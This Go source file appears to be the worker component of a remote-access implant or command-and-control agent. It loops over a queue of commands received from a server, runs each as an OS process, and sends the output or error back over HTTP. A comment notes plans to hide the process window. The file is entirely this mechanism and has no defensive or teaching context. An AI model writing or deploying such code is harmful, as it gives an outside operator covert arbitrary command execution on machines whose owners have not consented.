package internal

import (
	"os/exec"
	"time"
)

type Worker struct {
	Kill     bool
	HttpConn *HttpConn
	ReqQueue *SafeRequestQueue
	CmdQueue *SafeCommandQueue
}

func (w *Worker) Run() {
	for !w.Kill {
		// prevent from maxing out CPU by adding in delay
		time.Sleep(100 * time.Millisecond)

		if command := w.CmdQueue.GetNext(); command != nil {
			op := command[0]
			args := command[1:]
			// can't hide window right now but can add options via flags to hide the window
			cmd := exec.Command(op, args...)
			ret, err := cmd.CombinedOutput()

			if err != nil {
				newReq, err := w.HttpConn.NewCmdResultRequest([]byte(err.Error()))
				if err != nil {
					continue
				}
				w.ReqQueue.Add(newReq)
				continue
			}
			newReq, err := w.HttpConn.NewCmdResultRequest(ret)
			if err != nil {
				continue
			}
			w.ReqQueue.Add(newReq)
		}
	}
	return
}
